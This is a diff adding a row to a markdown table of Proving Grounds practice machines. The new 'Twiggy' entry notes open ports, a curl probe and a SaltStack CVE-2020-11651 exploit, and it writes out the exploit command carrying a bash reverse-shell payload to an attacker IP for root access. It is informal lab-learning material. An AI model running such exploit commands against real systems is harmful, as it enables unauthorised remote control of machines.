@@ -93,7 +93,7 @@
 | Name | Level | Description|
 |:-|:-|:-|
 |[Hetemit](https://medium.com/@c00540105/hetemit-proving-grounds-practice-a9d8dc95afd5) |Intermediate | Takeouts from this article give insights into Python code, vulnerable API design done by developers, enumeration of curl command, and Python OS module. Link|
-|Twiggy | | |
+|Twiggy |Easy | It has port 80(web) and 8000(some api) is port 4505,6 are open ZMTP with port 8000 ```curl http://192.168.166.62:8000 -v``` saw that **salt-api/3000-1**  vulnerability using the this [cve-2020-11651](https://github.com/dozernz/cve-2020-11651), got the reverse shell with root access ```python3 cve-2020-11651.py 192.168.166.62 master 'bash -i >& /dev/tcp/192.168.45.248/80 0>&1'``` make the open ports  |
 |Exfiltrated | | |
 |Pelican | | |
 |Astronaut | | |
